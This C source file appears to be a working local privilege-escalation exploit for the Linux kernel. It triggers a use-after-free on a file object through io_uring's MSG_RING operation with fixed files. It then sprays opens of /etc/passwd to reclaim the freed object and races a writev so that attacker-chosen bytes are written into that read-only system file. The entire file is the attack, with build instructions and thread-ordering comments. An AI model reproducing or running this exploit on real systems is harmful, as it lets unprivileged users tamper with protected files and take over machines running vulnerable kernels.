// gcc exp_dirtyfile.c -o exp_dirtyfile -static -no-pie -s -luring -lpthread \
//     -L ./liburing/ -I ./liburing/include

#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <linux/kcmp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>

#include "liburing.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...)                                                         \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,      \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,     \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
    do {                                                                       \
        loge(fmt, ##__VA_ARGS__);                                              \
        loge("Exit at line %d", __LINE__);                                     \
        exit(1);                                                               \
    } while (0)

#define TEMP_WORKDIR "/tmp/exp_dir"
#define TEMP_VICTIM_FILE "victim"
#define TEMP_VICTIM_SYMLINK "uaf"

#define MAX_FILE_NUM 800

#define kcmp(pid1, pid2, type, idx1, idx2)                                     \
    syscall(__NR_kcmp, pid1, pid2, type, idx1, idx2)

#define ATTACK_FILE "/etc/passwd"
char attack_data[] = {0x41, 0x41, 0x41, 0x41};

int uaf_fd = -1;

int spray_fds[MAX_FILE_NUM];
pthread_spinlock_t write_mutex;
pthread_spinlock_t spray_mutex;

void prepare_workdir() {
    logd("perpare the environment ...");
    char *cmdline;
    asprintf(&cmdline, "rm -rf %s && mkdir -p %s && touch '%s/%s'",
             TEMP_WORKDIR, TEMP_WORKDIR, TEMP_WORKDIR, TEMP_VICTIM_FILE);
    if (system(cmdline) != 0) {
        die("create temp workdir: %m");
    }

    if (chmod(TEMP_WORKDIR, 0777)) {
        die("chmod: %m");
    }

    if (chdir(TEMP_WORKDIR)) {
        die("chdir: %m");
    }
    free(cmdline);
}

void *task_slow_write(void *args) {
    logd("start slow write to get the lock");
    int fd = open(TEMP_VICTIM_SYMLINK, O_WRONLY);

    if (fd < 0) {
        die("error open uaf file: %m");
    }

    unsigned long int addr = 0x30000000;
    int offset;
    for (offset = 0; offset < 0x20000; offset++) {
        if (mmap((void *)(addr + offset * 0x1000), 0x1000,
                 PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0,
                 0) == MAP_FAILED) {
            loge("allocate failed at 0x%x", offset);
        }
    }

    assert(offset > 0);

    void *mem = (void *)(addr);
    *(uint32_t *)mem = 0x41414141;

#define IOVEC_CNT 5
    struct iovec iov[IOVEC_CNT];
    for (int i = 0; i < IOVEC_CNT; i++) {
        iov[i].iov_base = mem;
        iov[i].iov_len = (offset - 1) * 0x1000;
    }

    pthread_spin_unlock(&write_mutex);
    // [1]：最先执行
    logd("start slow writev ...");
    if (writev(fd, iov, IOVEC_CNT) < 0) {
        die("slow writev: %m");
    }
#undef IOVEC_CNT
    logd("slow writev done!");
    return NULL;
}

void *task_write_cmd(void *args) {
    struct iovec iov = {.iov_base = attack_data,
                        .iov_len = sizeof(attack_data)};

    pthread_spin_lock(&write_mutex);
    pthread_spin_unlock(&spray_mutex);

    // [2]：会等[1]执行完再执行
    logd("start writev 2 ...");
    int ans = writev(uaf_fd, &iov, 1);
    if (ans < 0) {
        loge("failed to write:(%d) %m", errno);
    }
    logd("writev 2 done");
    return NULL;
}

void trigger_fd_uaf(int fd) {
#ifndef REQ_F_FIXED_FILE
#define REQ_F_FIXED_FILE 1
#endif
    logd("trigger fd %d UAF ...", fd);

    struct io_uring ring;
    struct io_uring_sqe *sqe;
    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &fd, 1);

    // i = 3 because slow writev() cause refcnt +1
    for (int i = 0; i < 3; i++) {
        sqe = io_uring_get_sqe(&ring);
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->flags = REQ_F_FIXED_FILE;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }

    // init_task_work(&file->f_u.fu_rcuhead, ____fput);
    logd("wait task ____fput() to free the struct file ...");
    usleep(500 * 1000);
}

bool spray_files() {
    pthread_spin_lock(&spray_mutex);

    trigger_fd_uaf(uaf_fd);

    logd("spray_files start!");
    // [3]：因为[2]在等[1]，所以在[2]的实际写入之前执行
    bool find_overlap = false;
    logd("uaf_fd: %d, start spray ...", uaf_fd);
    for (int i = 0; i < MAX_FILE_NUM; i++) {
        spray_fds[i] = open(ATTACK_FILE, O_RDONLY);
        if (spray_fds[i] < 0) {
            die("open file %d: %m", i);
        }
        if (kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, spray_fds[i]) == 0) {
            logi("find overlap spray_fds[%d]: %d", i, spray_fds[i]);
            find_overlap = true;
            break;
        }
    }
    if (!find_overlap) {
        logw("not find overlap fd pairs :(");
    }

    return find_overlap;
}

int main(void) {
    prepare_workdir();

    symlink(TEMP_VICTIM_FILE, TEMP_VICTIM_SYMLINK);
    uaf_fd = open(TEMP_VICTIM_SYMLINK, O_WRONLY);
    logd("uaf_fd: %d", uaf_fd);
    if (uaf_fd < 0) {
        die("open: %m");
    }

    pthread_t p1, p2;
    pthread_spin_init(&write_mutex, 0);
    pthread_spin_init(&spray_mutex, 0);
    pthread_spin_lock(&write_mutex);
    pthread_spin_lock(&spray_mutex);
    pthread_create(&p1, NULL, task_slow_write, NULL);
    pthread_create(&p2, NULL, task_write_cmd, NULL);

    bool success = spray_files();

    pthread_join(p1, NULL);
    pthread_join(p2, NULL);
    pthread_spin_destroy(&spray_mutex);
    pthread_spin_destroy(&write_mutex);

    if (!success) {
        die("spray failed");
    }

    logi("exploit done");

    return 0;
}